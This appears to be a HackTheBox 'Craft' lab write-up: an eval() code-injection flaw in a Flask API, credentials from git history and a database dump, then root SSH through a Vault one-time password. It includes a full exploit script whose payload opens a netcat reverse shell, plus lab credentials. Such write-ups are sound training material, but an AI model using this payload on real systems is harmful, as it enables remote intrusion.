- Craft Was a nice realistic box That involved Analyzing code that being hosted on Gogs to find missing credentials and a Python Code Injection.
- First shell inside a docker sadly I didn't see the right thing fast and got drowned in some rabbit holes but got out of them eventually.
- Finding creds in Database and taking a step back to go again for Gogs and find a SSH Private key and then logging in as Gilfoyle.
- Inside Gilfoyle directory There is a Vault Token that is used to authenticate to [Vault](https://www.vaultproject.io/) software.
- Gilfoyle was using Vault to generate OTP for root SSH.
- By finding the OTP rule name from Gilfoyle repository I generated an OTP for root SSH and logged in as root.

### Main

---

Web had two links to two subdomain **api.craft.htb** and **gogs.craft.htb**

![Craft/Untitled.png](/assets/img/hackthebox/Craft/Untitled.png)

### API

---

Nothing interesting was here!

![Craft/Untitled%201.png](/assets/img/hackthebox/Craft/Untitled%201.png)

Every time I tried to do anything **API** responded

    {
      "message": "Invalid token or no token found."
    }

### Gogs

---

On Gogs I found a repository **craft-api**.

First look I found an issue that has been opened about a parameter **abv** that value needs to be checked before submitting to the database.

![Craft/Untitled%202.png](/assets/img/hackthebox/Craft/Untitled%202.png)

Looking at that commit and analyzing the source code before and after the developer fixed it.

Before

It would accept any value and pass it to **create_brew()**.

    def post(self):
            """
            Creates a new brew entry.
            """

            create_brew(request.json)
            return None, 201

After and live version!

Now the value gets passed first to **eval()** to evaluate the value first.

    def post(self):
            """
            Creates a new brew entry.
            """

            # make sure the ABV value is sane.
            if eval('%s > 1' % request.json['abv']):
                return "ABV must be a decimal value less than 1.0", 400
            else:
                create_brew(request.json)
                return None, 201

That's a **python code injection** vulnerability. I can pass values to **eval()** through **ABV**.

In latest commit, I found a script **test.py** that checks if **abv** issue has been solved or not.

    #!/usr/bin/env python

    import requests
    import json

    response = requests.get('https://api.craft.htb/api/auth/login',  auth=('', ''), verify=False)
    json_response = json.loads(response.text)
    token =  json_response['token']

    headers = { 'X-Craft-API-Token': token, 'Content-Type': 'application/json'  }

    # make sure token is valid
    response = requests.get('https://api.craft.htb/api/auth/check', headers=headers, verify=False)
    print(response.text)

    # create a sample brew with bogus ABV... should fail.

    print("Create bogus ABV brew")
    brew_dict = {}
    brew_dict['abv'] = '15.0'
    brew_dict['name'] = 'bullshit'
    brew_dict['brewer'] = 'bullshit'
    brew_dict['style'] = 'bullshit'

    json_data = json.dumps(brew_dict)
    response = requests.post('https://api.craft.htb/api/brew/', headers=headers, data=json_data, verify=False)
    print(response.text)


    # create a sample brew with real ABV... should succeed.
    print("Create real ABV brew")
    brew_dict = {}
    brew_dict['abv'] = '0.15'
    brew_dict['name'] = 'bullshit'
    brew_dict['brewer'] = 'bullshit'
    brew_dict['style'] = 'bullshit'

    json_data = json.dumps(brew_dict)
    response = requests.post('https://api.craft.htb/api/brew/', headers=headers, data=json_data, verify=False)
    print(response.text)

Looking at older commits of the same file I found it had creds and has been deleted in newer one.

    dinesh:4aUh0A8PbVJxgd

I logged in to Gogs with those creds as Dinesh but there was nothing new to what is already been public.

# Exploitation

---

So, Right now I will exploit that **python code injection** vulnerability to get a reverse shell.

## Shell in a Docker

---

So, I'll use **test.py** and edit it a little bit.

    #!/usr/bin/env python3
    import requests
    import json
    import sys

    if (len(sys.argv) < 2):
        print(f"Usage: {sys.argv[0]} IP PORT")
        sys.exit()

    ip = sys.argv[1]
    port = sys.argv[2]

    response = requests.get('https://api.craft.htb/api/auth/login',  auth=('dinesh', '4aUh0A8PbVJxgd'), verify=False)
    json_response = json.loads(response.text)
    token =  json_response['token']

    headers = { 'X-Craft-API-Token': token, 'Content-Type': 'application/json'  }
    # The payload i am sending to Eval is just executing a reverse shell inside os.system
    payload = f'__import__("os").system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f")'
    brew_dict = {}
    brew_dict['abv'] = payload
    brew_dict['name'] = 'bullshit'
    brew_dict['brewer'] = 'bullshit'
    brew_dict['style'] = 'bullshit'

    json_data = json.dumps(brew_dict)
    response = requests.post('https://api.craft.htb/api/brew/', headers=headers, data=json_data, verify=False)
    print(response.text)

Running my exploit

    root@kali:# python3 craft-api-exploit.py
    Usage: craft-api-exploit.py IP PORT
    root@kali:# python3 craft-api-exploit.py 10.10.15.38 9001

## Gilfoyle Repo

---

After some time in the docker trying to enumerate the network, maybe I can pivot to the real box. wasted some time in that and some other rabbit holes.

There was **dbtest.py** script in the repository testing connection to a database. Database wasn't on the same docker I am on and there was no MySQL installed so I had to enumerate the database with that python script.

    #!/usr/bin/env python
    import pymysql
    from craft_api import settings

    # test connection to mysql database

    connection = pymysql.connect(host=settings.MYSQL_DATABASE_HOST,
                                 user=settings.MYSQL_DATABASE_USER,
                                 password=settings.MYSQL_DATABASE_PASSWORD,
                                 db=settings.MYSQL_DATABASE_DB,
                                 cursorclass=pymysql.cursors.DictCursor)

    try:
        with connection.cursor() as cursor:
            sql = "SELECT `id`, `brewer`, `name`, `abv` FROM `brew` LIMIT 1"
            cursor.execute(sql)
            result = cursor.fetchone()
            print(result)

    finally:
        connection.close()

I have got the values from the database connection string by printing them but they weren't needed

    craft:qLGockJ6G2J75O

Database was on another docker

    /opt/app # ping -c 1 db
    PING db (172.20.0.4): 56 data bytes
    64 bytes from 172.20.0.4: seq=0 ttl=64 time=0.135 ms

    --- db ping statistics ---
    1 packets transmitted, 1 packets received, 0% packet loss
    round-trip min/avg/max = 0.135/0.135/0.135 ms

With no TTY its almost impossible to open Vi and edit a text so I will edit dbtest.py on my kali to take argument as SQL query.

I could had made a proxy and connected to that host with my kali but that is not necessary and with little coding can be skipped.

I've wasted some time thanks to **fetchone()** that only fetches the first row the database sends.

I changed it to **fetchall()**.

    #!/usr/bin/env python
    import pymysql
    from craft_api import settings
    import sys

    # test connection to mysql database

    connection = pymysql.connect(host=settings.MYSQL_DATABASE_HOST,
                                 user=settings.MYSQL_DATABASE_USER,
                                 password=settings.MYSQL_DATABASE_PASSWORD,
                                 db=settings.MYSQL_DATABASE_DB,
                                 cursorclass=pymysql.cursors.DictCursor)


    try:
        with connection.cursor() as cursor:
            sql = sys.argv[1] # Argument to take SQL Query
            cursor.execute(sql)
            result = cursor.fetchall() # Instead of fetchone()
            print(result)

    finally:
        connection.close()

Those the databases i found

    /opt/app # ./dbtest.py 'show databases;'
    [{'Database': 'craft'}, {'Database': 'information_schema'}]

Tables in craft database

    /opt/app # ./dbtest.py 'show tables;'
    [{'Tables_in_craft': 'brew'}, {'Tables_in_craft': 'user'}]

Fetching all data from user table

    /opt/app # ./dbtest.py 'select * from craft.user;'
    [{'id': 1, 'username': 'dinesh', 'password': '4aUh0A8PbVJxgd'}, {'id': 4, 'username': 'ebachman', 'password': 'llJ77D8QFkLPQB'}, {'id': 5, 'username': 'gilfoyle', 'password': 'ZEU3N8WNM2rh4T'}]

    ebachman:llJ77D8QFkLPQB
    gilfoyle:ZEU3N8WNM2rh4T

Nice, That's another creds for Gogs.

Gilfoyle creds worked and we did log in to his Gogs account.

## Shell as Gilfoyle

---

Every pair of creds I find I always try to SSH with. all creds I've found non of them worked for SSH on both ports.

So, After logging in with Gilfoyle on Gogs I found a privet repository **craft-infra**.

The first directory took my eyes was **.ssh** directory that contained a privet SSH key

# Privilege Escalation

---

Gilfoyle directory had something interesting.

    gilfoyle@craft:$ cat .vault-token
    f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9

After some searching for what **Vault Token** is. I found out about vault.

Vault secures, stores, and tightly controls access to tokens, passwords and things like that. Tokens are the core method for authentication within Vault.

Gilfoyle was using vault and I found vault directory on his repo. and there was secrets.sh

    #!/bin/bash

    # set up vault secrets backend

    vault secrets enable ssh

    vault write ssh/roles/root_otp \
        key_type=otp \
        default_user=root \
        cidr_list=0.0.0.0/0

What I understood from that script that Gilfoyle is using vault to generate OTP for root SSH. I did some searching on that and found [This](https://www.vaultproject.io/docs/secrets/ssh/one-time-ssh-passwords.html).

Create OTP for SSH by the help of the above website and the role from secrets.sh (No need to login to vault because token is already in .vault-token file in Gilfoyle directory)

    gilfoyle@craft:~$ vault ssh -role root_otp -mode otp root@127.0.0.1
    Vault could not locate "sshpass". The OTP code for the session is displayed
    below. Enter this code in the SSH password prompt. If you install sshpass,
    Vault can automatically perform this step for you.
    OTP for the session is: 8808cb25-03b3-c207-6d7f-5bafd6ce4b82
